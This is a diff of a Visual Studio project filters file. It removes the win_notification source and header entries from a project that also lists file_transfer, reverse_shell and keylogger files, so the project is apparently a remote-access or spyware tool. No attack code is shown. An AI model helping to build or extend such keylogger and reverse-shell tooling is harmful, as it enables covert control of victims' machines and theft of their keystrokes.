@@ -33,9 +33,6 @@
     <ClCompile Include="src\file_transfer.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="src\win_notification.cpp">
-      <Filter>Source Files</Filter>
-    </ClCompile>
     <ClCompile Include="src\reverse_shell.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
@@ -57,9 +54,6 @@
       <Filter>Header Files</Filter>
     </ClInclude>
     <ClInclude Include="src\keylogger.hpp">
-      <Filter>Header Files</Filter>
-    </ClInclude>
-    <ClInclude Include="src\win_notification.hpp">
       <Filter>Header Files</Filter>
     </ClInclude>
     <ClInclude Include="src\reverse_shell.hpp">
